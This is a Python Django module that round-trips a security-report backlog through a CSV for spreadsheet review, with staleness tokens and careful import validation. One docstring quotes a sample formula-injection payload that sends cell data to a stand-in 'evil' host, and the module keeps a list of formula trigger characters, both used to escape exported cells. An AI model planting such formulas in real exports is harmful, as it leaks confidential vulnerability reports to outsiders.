"""Round-trip the security backlog through a spreadsheet other people can see.

A security backlog is not a one-person job. The maintainer running this install
triages, but the ruling is often a PMC's, and a PMC is not going to be handed a
Tailscale address, a Django login and a browser tab. What they will do is open a
Google Doc somebody already shared with them.

So: **export a CSV, paste it into a Sheet with whatever ACL the project already
trusts, let people edit the decision columns, download it and import it back.**
Nothing here talks to Google. That is the point.

Why not the Sheets API
----------------------
Because it costs the operator a setup session before a single row moves. Google's
own Python quickstart lists, as prerequisites: a Google Cloud project, the Sheets
API enabled on it, an OAuth consent screen configured, and a desktop-app OAuth
client whose ``credentials.json`` you download by hand — or a service account
key, which is worse for this job, because a service account has no Drive storage
quota of its own and so cannot create the spreadsheet it is meant to write to
unless you also set up a shared drive. Then it needs a browser consent dance on
first run, on a box whose whole selling point is that it runs headless next to
your worker. A CSV needs none of that: *File → Import* going in, *File → Download
→ Comma-separated values* coming out, and the sharing settings stay exactly where
the project already manages them.

The round trip is guarded
-------------------------
Two things make a naive CSV import a data-loss bug, and both are handled here:

1. **A stale sheet.** Between export and import the operator triages, the worker
   finishes a run, someone rules on a report in the dashboard. Importing the old
   sheet on top of that reverts it, silently. So every row carries a ``check``
   token — a short digest of exactly the fields this importer is allowed to write.
   If it doesn't match the row's current state, the import *refuses that row* and
   says so, rather than picking a winner. ``force=True`` overrides, per run, out
   loud.
2. **A missing column.** A reviewer who deletes a column they don't care about
   must not thereby blank that field on every report. Only columns actually
   present in the header are considered writable; absent means "no instruction",
   never "set to empty".

And the export is escaped: report titles come out of emailed reports and scanner
archives, i.e. from whoever filed them, and a cell beginning ``=`` or ``@`` is a
live formula in Sheets and Excel. See :func:`_escape_cell`.
"""

from __future__ import annotations

import csv
import hashlib
import io
import logging
import re
from collections.abc import Iterable, Iterator
from dataclasses import dataclass, field
from typing import TYPE_CHECKING

from django.db import transaction
from django.utils import timezone

from franktheunicorn.core.models import SecurityReport

if TYPE_CHECKING:
    # Structural, not TextIO: the export writes to a real file, to a StringIO and
    # to Django's OutputWrapper (which is a management command's stdout and is
    # none of the above). All csv needs is .write.
    from _typeshed import SupportsWrite
    from django.db.models import QuerySet

logger = logging.getLogger(__name__)


#: Cell budget for context columns. A Sheets cell holds 50,000 characters, but a
#: reviewer scanning 200 rows does not want a 40 KB triage summary in one of
#: them — and a cell truncated without saying so is a lie they can't see. So
#: context is cut short with a marker and the report id is right there for
#: anyone who needs the whole thing.
MAX_CELL_CHARS = 3000

#: Cell budget for the ``--full`` columns (raw report text, proposed patch),
#: which are opt-in precisely because they're big. Still under the Sheets cell
#: limit, with room for the marker.
MAX_FULL_CELL_CHARS = 45_000

#: Cell budget for the two *writable* note columns. Bounded reluctantly — a
#: truncated writable cell can't be written back without losing the tail, which
#: is why these were left alone at first — but unbounded was worse: they're
#: ``TextField``s fed by a textarea with no length cap, and a note past
#: :func:`csv.field_size_limit` (131,072) produced an export that this module's
#: own importer refuses *in its entirety*. Sheets also caps a cell at 50,000, so
#: an over-long note broke the round trip at *File → Import*, before any reviewer
#: saw a row. 45,000 clears both, and a note that long is already pathological —
#: when it does happen the cell keeps its marker and
#: :func:`_proposed_changes` refuses to write that column back, out loud.
MAX_NOTE_CHARS = 45_000

TRUNCATION_MARKER = "\n[… truncated — open the report in franktheunicorn]"

#: Refuse a CSV bigger than this rather than chewing through it. The dashboard
#: door has its own upload cap; this one covers the CLI, where the argument is a
#: path and a mistyped one can be anything at all.
MAX_IMPORT_ROWS = 5000

#: The join key and the staleness guard. An import without both is not an import
#: of an export from here.
KEY_COLUMN = "report_id"
CHECK_COLUMN = "check"

#: Columns this importer will write back, in the order they appear in the sheet.
#: Everything else round-trips as read-only context. Keep the block contiguous
#: and near the left: a reviewer should not have to scroll to find the cells
#: they're meant to touch.
WRITABLE_COLUMNS = (
    "status",
    "severity",
    "duplicate_of_cve",
    "external_notes",
    "operator_notes",
)

#: Full header order. `check` sits second so it's visible rather than hidden off
#: to the right where somebody deletes it as mystery junk.
_HEADER = (
    KEY_COLUMN,
    CHECK_COLUMN,
    "project",
    "priority",
    "title",
    *WRITABLE_COLUMNS,
    "component",
    "impact",
    "triage_summary",
    "priority_reason",
    "source",
    "source_archive",
    "finding_id",
    "created",
)

_FULL_HEADER = (*_HEADER, "raw_text", "proposed_patch")

#: Columns whose value must stay a number for the sheet to sort on it, so they
#: skip the apostrophe escaping. Both are generated here, not by a reporter.
_NUMERIC_COLUMNS = frozenset({KEY_COLUMN, "priority"})

#: Leading characters that make a spreadsheet treat a cell as a formula rather
#: than text. `=` and `+` are the obvious ones; Excel also honours `-` and `@`,
#: and a leading tab or CR can be used to sneak past a naive filter.
_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")

#: Bounded on purpose. ``\d{4,}`` with no ceiling accepted ``CVE-2026-`` followed
#: by two hundred digits, which is a valid-looking 209-character string going into
#: a ``CharField(max_length=50)`` — SQLite doesn't enforce max_length, so it
#: stored fine and would have exploded on the Postgres install the docs promise.
#: Real CVE ids run to seven digits; nineteen keeps the whole thing under 30.
_CVE_RE = re.compile(r"^CVE-\d{4}-\d{4,19}$", re.IGNORECASE)

#: Everything in C0 except tab and newline. See :func:`_cell`.
_CONTROL_CHARS = re.compile(r"[\x00-\x08\x0b-\x1f\x7f]")

#: Biggest value SQLite will take in an INTEGER column, and bigint's ceiling on
#: Postgres. A ``report_id`` cell of twenty digits parses as a Python int quite
#: happily and then raises OverflowError out of the ``pk__in`` query — an
#: unhandled 500 on an endpoint anyone on the Tailscale net can POST to.
_MAX_REPORT_ID = 2**63 - 1


# --------------------------------------------------------------------------- #
# Cells
# --------------------------------------------------------------------------- #


def _escape_cell(value: str) -> str:
    """Neutralise a cell that a spreadsheet would otherwise run as a formula.

    Report titles, reporter names and scanner text are attacker-supplied: a
    report filed as ``=HYPERLINK("https://evil/"&A2,"click")`` becomes a live
    formula, in a document we are about to hand a PMC. Prefixing an apostrophe
    is the standard fix — Sheets and Excel both read it as "the rest of this is
    text" and don't display it.

    Coming back, the import does **not** strip this by looking for a leading
    apostrophe. It can't: a note that genuinely opens with one —
    ``'--force' is not the answer here`` — is character-for-character
    indistinguishable from an escaped ``--force'...``, and stripping ate the
    reviewer's quote mark. Instead :func:`_proposed_changes` compares an incoming
    cell against both the stored text *and* ``_escape_cell(stored)``, so a cell
    that made the round trip untouched reads as unchanged either way, and a cell
    somebody actually edited is stored exactly as they typed it.
    """
    if value.startswith(_FORMULA_TRIGGERS):
        return "'" + value
    return value


def looks_like_cve(value: str) -> bool:
    """Whether *value* is a CVE id this codebase will store.

    Public because ``matched_cve_id`` has two writers — this importer and the
    dashboard's verdict form — and a column validated by one of them is a column
    validated by neither.
    """
    return bool(_CVE_RE.match(value))


def _truncate(value: str, limit: int) -> str:
    if len(value) <= limit:
        return value
    return value[:limit] + TRUNCATION_MARKER


def report_fingerprint(report: SecurityReport) -> str:
    """Short opaque token for the writable state of one report.

    Covers exactly the fields :func:`import_reports_csv` can write, so it changes
    when — and only when — an import would have something to clobber. A newer
    ``triage_summary`` from the worker is not a conflict with a PMC's comment and
    must not read as one.

    The id goes in too, which makes this a row-integrity check as well as a
    staleness one. Without it, two reports whose writable state happens to match —
    trivially common, most rows are ``new``/``unknown`` with no notes — get
    identical tokens, so a sheet whose rows got sorted without their key column
    would apply one finding's ruling to another and the guard would wave it
    through. With it, a token from the wrong row reads as stale and conflicts.

    Prefixed ``fp`` rather than left as bare hex because a spreadsheet will read
    an all-digit string as a number and reformat it: about 1 row in 100 gets a
    ten-character digest with no letters in it, and losing the leading zeros off
    those would silently disarm the guard on exactly the rows it happened to.
    Dates have the same problem, which is why this isn't a timestamp.
    """
    payload = "\x1f".join(
        [
            str(report.pk),
            report.status,
            report.assessed_severity,
            report.matched_cve_id,
            report.external_notes,
            report.operator_notes,
        ]
    )
    return "fp" + hashlib.sha256(payload.encode("utf-8")).hexdigest()[:10]


# --------------------------------------------------------------------------- #
# Export
# --------------------------------------------------------------------------- #


def _row_for(report: SecurityReport, *, full: bool) -> dict[str, str]:
    project = report.project.full_name if report.project else ""
    row = {
        KEY_COLUMN: str(report.pk),
        CHECK_COLUMN: report_fingerprint(report),
        "project": project,
        # No decimals: the number is a rank, and a column of 61.5s invites
        # somebody to read precision into a heuristic that hasn't got any.
        "priority": f"{report.priority:.0f}",
        "title": report.title,
        "status": report.status,
        "severity": report.assessed_severity,
        "duplicate_of_cve": report.matched_cve_id,
        "external_notes": _truncate(report.external_notes, MAX_NOTE_CHARS),
        "operator_notes": _truncate(report.operator_notes, MAX_NOTE_CHARS),
        "component": report.parsed_component,
        "impact": _truncate(report.parsed_impact, MAX_CELL_CHARS),
        "triage_summary": _truncate(report.triage_summary, MAX_CELL_CHARS),
        "priority_reason": report.priority_reason,
        "source": report.source,
        "source_archive": report.source_archive,
        "finding_id": report.finding_id,
        # Date only. A full timestamp is noise in a review sheet, and Sheets
        # reformats it on import anyway — nothing here parses it back.
        "created": report.created_at.date().isoformat(),
    }
    if full:
        row["raw_text"] = _truncate(report.raw_text, MAX_FULL_CELL_CHARS)
        row["proposed_patch"] = _truncate(report.proposed_patch, MAX_FULL_CELL_CHARS)
    return {
        key: value if key in _NUMERIC_COLUMNS else _escape_cell(value) for key, value in row.items()
    }


def export_reports_csv(
    reports: Iterable[SecurityReport],
    out: SupportsWrite[str],
    *,
    full: bool = False,
) -> int:
    """Write ``reports`` as the review CSV to ``out``. Returns the row count.

    ``full`` adds the raw report text and any proposed patch. Off by default:
    those are the two big columns, and the sheet exists for the *decision*, not
    the payload — a reviewer who needs the payload has the report id. It also
    means the default export is a good deal less sensitive to leave sitting in
    somebody's Drive.

    Delegates to :func:`stream_reports_csv` rather than repeating the header and
    row loop. The two used to be parallel implementations kept honest by a test
    asserting they produced identical bytes, which is managing the risk by
    assertion instead of by construction: a new column or an escaping change had
    to be made twice, and the CLI door and the dashboard door would have drifted
    silently.
    """
    written = 0

    def counted() -> Iterator[SecurityReport]:
        nonlocal written
        for report in reports:
            written += 1
            yield report

    for chunk in stream_reports_csv(counted(), full=full):
        out.write(chunk)
    return written


def stream_reports_csv(
    reports: Iterable[SecurityReport],
    *,
    full: bool = False,
) -> Iterator[str]:
    """The same CSV, yielded a row at a time for :class:`StreamingHttpResponse`.

    The dashboard serves this straight out of a request, so it must not build the
    whole file in memory first: an install with a couple of scanner archives in
    it is thousands of rows, and with ``full`` on, each of those rows can carry
    45 KB of patch.
    """
    buffer = _RowBuffer()
    writer = csv.DictWriter(
        buffer, fieldnames=_FULL_HEADER if full else _HEADER, lineterminator="\n"
    )
    writer.writeheader()
    yield buffer.take()
    for report in reports:
        writer.writerow(_row_for(report, full=full))
        yield buffer.take()


class _RowBuffer:
    """Minimal write-target for :mod:`csv`, emptied after every row."""

    def __init__(self) -> None:
        self._parts: list[str] = []

    def write(self, value: str) -> int:
        self._parts.append(value)
        return len(value)

    def take(self) -> str:
        joined = "".join(self._parts)
        self._parts.clear()
        return joined


def export_filename(*, full: bool = False, status: str = "") -> str:
    """A filename that says what the sheet is, dated, for a Downloads folder.

    The status filter is in there because without it two differently-scoped
    exports on the same day are both ``security-review-<date>.csv``, the browser
    names the second one ``(1)``, and nothing in either file says which slice of
    the backlog it holds — which is how the wrong sheet gets sent to the PMC, or
    the wrong one imported back. Callers validate status against
    ``STATUS_CHOICES`` before it reaches here.
    """
    stamp = timezone.now().date().isoformat()
    scope = f"-{status}" if status else ""
    suffix = "-full" if full else ""
    return f"security-review{scope}-{stamp}{suffix}.csv"


# --------------------------------------------------------------------------- #
# Import
# --------------------------------------------------------------------------- #


@dataclass(frozen=True)
class RowOutcome:
    """What became of one row of the sheet."""

    #: 1-based row number as a spreadsheet counts them, header included, so
    #: "row 14" in a message is row 14 in the reviewer's window.
    row: int
    report_id: int | None
    #: "applied", "unchanged", "conflict", "unknown-report", "no-id",
    #: "duplicate-row", or "invalid".
    outcome: str
    detail: str = ""
    #: Which fields this row changed, for the operator's audit line.
    changed: tuple[str, ...] = ()

    @property
    def needs_attention(self) -> bool:
        """Whether the operator has to be shown this row.

        Lives here, next to the data, because the answer was previously spelled
        out as literal outcome strings at three call sites that disagreed: the
        CLI and the dashboard both used "not applied and not unchanged", which
        skipped a row that *applied by overwriting somebody's newer ruling* —
        the loudest thing this importer can do. An applied row with something to
        say about it counts, and that is the whole rule.
        """
        return self.outcome not in ("applied", "unchanged") or bool(self.detail)


@dataclass
class SheetImportResult:
    """Everything the import looked at, so nothing goes by unaccounted for."""

    rows: list[RowOutcome] = field(default_factory=list)
    #: Set when the import stopped rather than skipped something. The CLI turns
    #: this into a non-zero exit.
    error: str = ""
    #: Things the operator should know that aren't failures.
    warnings: list[str] = field(default_factory=list)
    dry_run: bool = False
    #: Rows that were applied with no staleness guard to check them against,
    #: because the sheet had no `check` column. Counted separately from clean
    #: applies: it's the same write with less confidence behind it.
    unguarded: int = 0

    def _count(self, outcome: str) -> int:
        return sum(1 for row in self.rows if row.outcome == outcome)

    @property
    def applied(self) -> int:
        return self._count("applied")

    @property
    def unchanged(self) -> int:
        return self._count("unchanged")

    @property
    def conflicts(self) -> int:
        return self._count("conflict")

    @property
    def forced(self) -> int:
        """Rows applied over a state newer than the sheet.

        Counted, not just detailed, because it is the one outcome here that
        destroys work somebody had already done, and the summary line was
        reporting it as an ordinary "applied 1".
        """
        return sum(1 for row in self.rows if row.detail.startswith("forced"))

    @property
    def failed(self) -> int:
        return (
            self._count("invalid")
            + self._count("unknown-report")
            + self._count("no-id")
            + self._count("duplicate-row")
        )

    def summary(self) -> str:
        """One line for a flash message or a command's stdout."""
        if self.error and not self.applied:
            return f"Import failed: {self.error}"
        verb = "would apply" if self.dry_run else "applied"
        parts = [f"{verb} {self.applied}"]
        if self.forced:
            parts.append(f"{self.forced} forced over newer work")
        if self.unchanged:
            parts.append(f"{self.unchanged} unchanged")
        if self.conflicts:
            parts.append(f"{self.conflicts} conflicted")
        if self.failed:
            parts.append(f"{self.failed} rejected")
        if self.unguarded:
            # Said in the summary, not just left in a counter. A blank check cell
            # gets the same write as a good one with none of the confidence, and
            # "applied 1" alone told the operator it was checked when it wasn't.
            parts.append(f"{self.unguarded} unchecked")
        line = f"Sheet import: {', '.join(parts)}."
        if self.unguarded:
            line += (
                f" {self.unguarded} row(s) had no check token, so nothing could be"
                " compared against the report's current state — those were applied"
                " blind."
            )
        if self.conflicts:
            # Door-neutral wording. This string is rendered verbatim into the
            # dashboard's flash message, where "--force" names a flag that
            # doesn't exist — the control there is a checkbox.
            line += (
                " Conflicted rows changed in franktheunicorn after the export —"
                " re-export, or re-import letting the sheet win."
            )
        return line


def _match_choice(value: str, choices: list[tuple[str, str]]) -> str | None:
    """Resolve a cell to a choice key, accepting the label a reviewer would type.

    Nobody hand-typing into a spreadsheet writes ``expected-behavior``; they
    write ``Expected Behavior``, because that's what the dashboard calls it. Both
    resolve, and so does either with the separators swapped, because the third
    thing people type is ``expected_behavior``.
    """
    wanted = value.strip().lower()
    if not wanted:
        return None
    loosened = wanted.replace(" ", "-").replace("_", "-")
    for key, label in choices:
        if wanted in (key.lower(), label.lower()) or loosened == key.lower():
            return key
    return None


def _cell(row: dict[str, str | None], column: str) -> str | None:
    """One cell, normalised — or None when the row simply doesn't have it.

    The None matters, and getting it wrong is silent data loss. :class:`csv.DictReader`
    fills missing trailing cells with ``restval``, i.e. ``None``, and a real
    spreadsheet export *does* produce short rows — trailing empty columns get
    dropped. Verified::

        >>> list(csv.DictReader(io.StringIO("id,notes\\n2\\n")))
        [{'id': '2', 'notes': None}]

    Collapse that to ``""`` and a short row reads as "the reviewer emptied this
    field", so importing a perfectly ordinary download wipes every note in the
    backlog. So: ``None`` means no instruction, ``""`` means they cleared it.

    Whitespace is stripped and CRLF folded to LF. A sheet downloaded on Windows
    brings CRLF along, and a note differing from the stored one only in line
    endings would otherwise read as an edit on every import. The strip does mean
    a stored note with leading or trailing spaces loses them the first time it
    round-trips — once, not repeatedly, and a note is no worse for it.

    C0 control characters go too, NUL included. SQLite stores a NUL in a text
    column quite happily; Postgres refuses it outright, and this codebase is
    meant to run on both. Tab and newline are kept — they're the only two a
    spreadsheet cell legitimately contains.
    """
    value = row.get(column)
    if value is None:
        return None
    return _fold(value)


def _fold(value: str) -> str:
    """CRLF to LF, C0 controls out, ends trimmed. See :func:`_cell`."""
    return _CONTROL_CHARS.sub("", value.replace("\r\n", "\n").replace("\r", "\n")).strip()


def _same_text(cell: str, stored: str) -> bool:
    """True when this cell is the stored text, modulo the round trip's own noise.

    Three kinds of noise, none of which is an edit by a human being:

    * **The escaping apostrophe.** ``_escape_cell`` put it there and Excel keeps
      it. Compared against rather than stripped off, because a note that really
      opens with an apostrophe — ``'--force' is not the answer`` — is
      indistinguishable from an escaped ``--force``, and stripping ate the quote.
    * **CRLF.** Browsers submit a textarea with CRLF line endings, per the HTML
      spec, so *every* note the operator saved through the dashboard has them.
      Without this, importing an untouched sheet reported "applied 1" and
      rewrote the stored text to LF — a phantom edit on a row nobody had touched,
      which is exactly the noise that teaches an operator to ignore the summary.
    * **Leading and trailing whitespace**, which ``_fold`` trims off the cell.

    All four combinations, and the order they compose in matters. ``_escape_cell``
    runs on the *stored* value at export time, so a note beginning with a blank
    line — ``"\\r\\nfoo"``, which is what a textarea gives you — has CR as its first
    character, CR is a formula trigger, and it goes out as ``"'\\r\\nfoo"``. The
    cell comes back folded to ``"'\\nfoo"``, which matches neither ``stored`` nor
    ``_escape_cell(stored)`` (still CR) nor ``_escape_cell(_fold(stored))`` (fold
    strips the leading blank line, so nothing left to escape). Only
    ``_fold(_escape_cell(stored))`` — escape first, then fold — matches. Without
    it, an untouched round trip stored ``"'\\nfoo"``: blank line gone, apostrophe
    promoted to line one, and the rewrite burned the check token so re-importing
    the same sheet then conflicted. Verified.
    """
    folded = _fold(stored)
    return cell in (
        stored,
        folded,
        _escape_cell(stored),
        _escape_cell(folded),
        _fold(_escape_cell(stored)),
    )


def _parse_report_id(raw_row: dict[str, str | None]) -> tuple[int | None, str | None]:
    """The key cell as an id, or None and the reason it isn't one.

    Shared by the bulk fetch and the per-row path so both apply the same bound.
    They used to parse separately, and the fetch's copy is the one that reached
    the database — so bounding only the row path would have fixed nothing.
    """
    raw_id = (raw_row.get(KEY_COLUMN) or "").strip()
    if not raw_id:
        # A row somebody typed at the bottom of the sheet. Not worth stopping the
        # import for, but it does need saying: what they wrote is going nowhere,
        # and silence would read as "filed".
        return None, "no report_id"
    try:
        report_id = int(raw_id)
    except ValueError:
        return None, f"report_id {raw_id!r} isn't a number"
    if not 1 <= report_id <= _MAX_REPORT_ID:
        return None, f"report_id {raw_id!r} isn't a possible id"
    return report_id, None


def _proposed_changes(
    row: dict[str, str | None],
    report: SecurityReport,
    present: set[str],
) -> tuple[dict[str, str], str, list[str]]:
    """Work out what this row wants changed.

    Returns ``(field -> value, error, notes)``. ``notes`` is for things the
    operator has to be told about a row that otherwise applied cleanly — a cell
    deliberately not written back. Carried out rather than logged, because the
    browser door has no log the operator reads.

    Only looks at columns in ``present``: a column the reviewer deleted is an
    absence of instruction, not an instruction to blank the field. Same for a
    cell the row stops short of — see :func:`_cell`.
    """
    changes: dict[str, str] = {}
    notes: list[str] = []

    if "status" in present:
        raw = _cell(row, "status")
        if raw:
            status = _match_choice(raw, SecurityReport.STATUS_CHOICES)
            if status is None:
                allowed = ", ".join(key for key, _ in SecurityReport.STATUS_CHOICES)
                return {}, f"status {raw!r} isn't one of: {allowed}", notes
            if status != report.status:
                changes["status"] = status

    if "severity" in present:
        raw = _cell(row, "severity")
        if raw:
            severity = _match_choice(raw, SecurityReport.SEVERITY_CHOICES)
            if severity is None:
                allowed = ", ".join(key for key, _ in SecurityReport.SEVERITY_CHOICES)
                return {}, f"severity {raw!r} isn't one of: {allowed}", notes
            if severity != report.assessed_severity:
                changes["assessed_severity"] = severity

    if "duplicate_of_cve" in present:
        cve = _cell(row, "duplicate_of_cve")
        if cve is not None:
            if cve and not _CVE_RE.match(cve):
                return {}, f"duplicate_of_cve {cve!r} isn't a CVE id (CVE-2026-1234)", notes
            # Upper-cased so `cve-2026-1234` and `CVE-2026-1234` don't read as two
            # different duplicates of the same thing.
            if cve.upper() != report.matched_cve_id:
                changes["matched_cve_id"] = cve.upper()

    # Same name in the sheet as on the model, so no mapping table to drift.
    for column in ("external_notes", "operator_notes"):
        if column not in present:
            continue
        text = _cell(row, column)
        if text is None:
            continue
        if _same_text(text, getattr(report, column)):
            continue
        if text.endswith(TRUNCATION_MARKER.strip()):
            # The cell is still carrying the marker the export put there, so
            # whatever it holds is a prefix of the stored note. Writing it back
            # would delete the tail. Said out loud rather than skipped quietly,
            # because if the reviewer *did* edit the visible part, this is where
            # their edit stops — and they should hear that from the operator
            # rather than discover it a week later.
            notes.append(
                f"{column} left as it was: too long for a cell, so the sheet only had a prefix"
            )
            continue
        changes[column] = text

    return changes, "", notes


def _row_warnings(report: SecurityReport, changes: dict[str, str]) -> str:
    """Non-blocking notes about a row we're about to apply."""
    status = changes.get("status", report.status)
    cve = changes.get("matched_cve_id", report.matched_cve_id)
    if status == "duplicate" and not cve:
        # Applied anyway. The dashboard's verdict form clears matched_cve_id for
        # any status but "duplicate", and mirroring that here would mean a
        # reviewer who filled in a CVE while leaving the status alone lost the
        # CVE — silent deletion of the one thing they typed. So the columns are
        # independent and the gap gets mentioned instead.
        return "marked duplicate with no CVE id"
    return ""


def import_reports_csv(
    source: str | Iterable[str],
    *,
    dry_run: bool = False,
    force: bool = False,
) -> SheetImportResult:
    """Apply a reviewed export back onto the reports it came from.

    ``source`` is the whole file as one string, or an open file, or any iterable
    of lines *that still have their line endings on*.

    Taking a bare string is not laziness, it's the fix for a real bug: the
    obvious way to turn an uploaded file into lines is ``text.splitlines()``, and
    that quietly **deletes** the newline inside a quoted multi-line cell —
    ``"one\\ntwo"`` reads back as ``onetwo``, two words run together. Every
    multi-line note in the sheet would come back mangled, and nothing would say
    so. Verified against :mod:`csv`, and it was live in the upload view for the
    length of one test run. So the split happens in here, once, correctly.

    ``force`` applies rows whose ``check`` token says the report changed after
    the export. Off by default: the alternative to refusing is picking a winner
    between a PMC's comment and the operator's later ruling without telling
    either of them.

    ``dry_run`` reports every outcome and writes nothing.
    """
    result = SheetImportResult(dry_run=dry_run)
    reader = csv.DictReader(io.StringIO(source) if isinstance(source, str) else source)

    try:
        header = reader.fieldnames
    except csv.Error as exc:  # pragma: no cover - malformed beyond parsing
        result.error = f"could not read the CSV: {exc}"
        return result

    if not header:
        result.error = "the file is empty"
        return result
    if KEY_COLUMN not in header:
        result.error = (
            f"no {KEY_COLUMN} column — this doesn't look like a franktheunicorn "
            "security export. Export one from the security page and edit that."
        )
        return result

    present = {column for column in WRITABLE_COLUMNS if column in header}
    if not present:
        result.error = (
            "none of the editable columns are in this file "
            f"({', '.join(WRITABLE_COLUMNS)}) — nothing to import."
        )
        return result

    guarded = CHECK_COLUMN in header
    if not guarded:
        result.warnings.append(
            f"No {CHECK_COLUMN} column, so nothing could be checked against the "
            "report's current state. Edits were applied blind — anything that "
            "changed here since the export has been overwritten."
        )

    # Bounded as it reads, not after. `list(reader)` then checking the length
    # means the cap is enforced by first pulling the whole file into memory —
    # which is no cap at all on the CLI door, where the argument is a path and a
    # mistyped one can point at anything on the disk.
    rows: list[dict[str, str | None]] = []
    try:
        for row in reader:
            if len(rows) >= MAX_IMPORT_ROWS:
                result.error = f"more than {MAX_IMPORT_ROWS} rows — export a narrower slice"
                return result
            rows.append(row)
    except csv.Error as exc:
        # Name the row. A cell over csv's own field limit (131,072 characters —
        # somebody pasted a stack trace into a note) raises out of the reader and
        # takes the *whole* import with it, including rows that parsed fine
        # earlier. That part is unavoidable: the reader's position is no longer
        # trustworthy once a field blows up, so applying the earlier half would
        # commit an arbitrary prefix of somebody's review. But "could not read the
        # CSV" with no row number is a hunt through a few hundred rows for a cell
        # you can't see the size of, which is the kind of unaccounted-for drop
        # this module's own summary exists to avoid.
        result.error = (
            f"could not read the CSV at row {len(rows) + 2}: {exc}. "
            "Nothing was imported — that row has a cell too big for a spreadsheet "
            "(shorten it, or put the detail in the report instead) — then re-run."
        )
        return result

    importer = _Importer(present=present, guarded=guarded, force=force, dry_run=dry_run)
    with transaction.atomic():
        # Inside the transaction, not before it. The staleness guard compares the
        # sheet's token against a fingerprint computed from these in-memory
        # instances, so a write landing between the read and the save — the worker
        # finishing a triage, a second browser tab — left the guard checking
        # against a snapshot that was already out of date, and the row overwrote
        # the newer value without conflicting and without --force. That is the one
        # failure the token exists to prevent. No select_for_update: SQLite is
        # first-class here and doesn't have it.
        importer.load(rows)
        for offset, raw_row in enumerate(rows):
            # +2: one for the header, one because spreadsheets count from 1, so
            # the number in a message is the number in the reviewer's window.
            result.rows.append(importer.apply(raw_row, offset + 2))
    result.unguarded = importer.unguarded

    logger.info(
        "Security sheet import: %d applied, %d unchanged, %d conflicts, %d rejected%s",
        result.applied,
        result.unchanged,
        result.conflicts,
        result.failed,
        " (dry run, nothing written)" if dry_run else "",
    )
    return result


class _Importer:
    """One import's worth of state: the column set, the flags, the rows seen.

    A class rather than eight positional arguments threaded through two
    functions, which is what this was and it was already wrong once.
    """

    def __init__(self, *, present: set[str], guarded: bool, force: bool, dry_run: bool) -> None:
        self.present = present
        self.guarded = guarded
        self.force = force
        self.dry_run = dry_run
        self.unguarded = 0
        self._seen: set[int] = set()
        self._reports: dict[int, SecurityReport] = {}

    def load(self, rows: list[dict[str, str | None]]) -> None:
        """Fetch every report the sheet mentions, in one query.

        A per-row lookup is a few thousand queries against the SQLite file the
        worker is also writing to.
        """
        ids = [report_id for row in rows if (report_id := _parse_report_id(row)[0]) is not None]
        self._reports = {
            report.pk: report
            for report in SecurityReport.objects.filter(pk__in=ids).select_related("project")
        }

    def apply(self, raw_row: dict[str, str | None], line: int) -> RowOutcome:
        """Resolve one row against the database. Saves unless ``dry_run``."""
        # Narrowed on report_id rather than on problem, so there's no assert here
        # holding the type together — `python -O` strips those.
        report_id, problem = _parse_report_id(raw_row)
        if report_id is None:
            return RowOutcome(
                row=line, report_id=None, outcome="no-id", detail=problem or "no report_id"
            )

        if report_id in self._seen:
            # Two rows for one report, usually a copy-paste. Applying both makes
            # the later one win for no stated reason, and the second row's check
            # token no longer matches what the first row just wrote.
            return RowOutcome(
                row=line,
                report_id=report_id,
                outcome="duplicate-row",
                detail="a row for this report already appeared earlier in the sheet",
            )
        self._seen.add(report_id)

        report = self._reports.get(report_id)
        if report is None:
            return RowOutcome(
                row=line,
                report_id=report_id,
                outcome="unknown-report",
                detail="no such report — dropped archive, or a sheet from another install",
            )

        changes, error, notes = _proposed_changes(raw_row, report, self.present)
        if error:
            return RowOutcome(row=line, report_id=report_id, outcome="invalid", detail=error)
        if not changes:
            return RowOutcome(
                row=line, report_id=report_id, outcome="unchanged", detail="; ".join(notes)
            )

        stale = self._is_stale(raw_row, report)
        if stale and not self.force:
            return RowOutcome(
                row=line,
                report_id=report_id,
                outcome="conflict",
                detail="changed in franktheunicorn after the export",
                # Named even though nothing was written: "row 14 conflicts" sends
                # the operator to look, "row 14 conflicts on status" tells them
                # whether they care.
                changed=tuple(sorted(changes)),
            )
        return self._write(report, changes, line, forced=stale, notes=notes)

    def _is_stale(self, raw_row: dict[str, str | None], report: SecurityReport) -> bool:
        """True when the report changed after this row was exported.

        An absent or empty token can't answer the question, so it counts as
        unguarded rather than as either answer.
        """
        stamp = (raw_row.get(CHECK_COLUMN) or "").strip() if self.guarded else ""
        if not stamp:
            self.unguarded += 1
            return False
        return stamp != report_fingerprint(report)

    def _write(
        self,
        report: SecurityReport,
        changes: dict[str, str],
        line: int,
        *,
        forced: bool,
        notes: list[str] | None = None,
    ) -> RowOutcome:
        parts = [*(notes or [])]
        if warning := _row_warnings(report, changes):
            parts.append(warning)
        if forced:
            # First, because it's the one that overwrote somebody's work.
            parts.insert(0, "forced over a newer state")
        note = "; ".join(parts)
        for attribute, value in changes.items():
            setattr(report, attribute, value)
        fields = list(changes)
        if "external_notes" in changes:
            # Stamped only when the text actually moved, so "last commented"
            # means what it says rather than "last time the sheet was imported".
            report.external_notes_at = timezone.now()
            fields.append("external_notes_at")
        if not self.dry_run:
            report.save(update_fields=[*fields, "updated_at"])
        return RowOutcome(
            row=line,
            report_id=report.pk,
            outcome="applied",
            detail=note,
            changed=tuple(sorted(changes)),
        )


#: Export orderings, keyed the same as the list page's ``sort`` parameter so the
#: two can't drift. "Newest" exists because a trickle of emailed reports all rank
#: 0.0 and arrival order is the right one for an inbox — and an export that
#: silently re-ranks is worse than one that doesn't offer the choice, because the
#: row cap then keeps a different set of reports than the operator was looking at.
EXPORT_SORTS = {
    "priority": ("-priority", "-created_at"),
    "newest": ("-created_at",),
}
DEFAULT_EXPORT_SORT = "priority"


def reports_for_export(
    *,
    status: str = "",
    project: str = "",
    limit: int | None = None,
    sort: str = DEFAULT_EXPORT_SORT,
) -> QuerySet[SecurityReport]:
    """The export selection, ordered the way the list page is ordering it.

    Defaults to priority because that's the order the sheet should be reviewed in
    and a reviewer works top-down; an unknown *sort* falls back to it rather than
    erroring, matching the list view.
    """
    order = EXPORT_SORTS.get(sort, EXPORT_SORTS[DEFAULT_EXPORT_SORT])
    reports = SecurityReport.objects.select_related("project").order_by(*order)
    if status:
        reports = reports.filter(status=status)
    if project:
        owner, _, repo = project.partition("/")
        reports = reports.filter(project__owner=owner, project__repo=repo)
    # `is not None`, not truthiness: limit=0 would otherwise fall through to an
    # unsliced queryset and export the entire backlog. No caller passes 0 today,
    # but of all the functions to fail open, one that writes unfixed
    # vulnerability reports into a shared sheet is the wrong one.
    if limit is not None:
        reports = reports[:limit]
    return reports
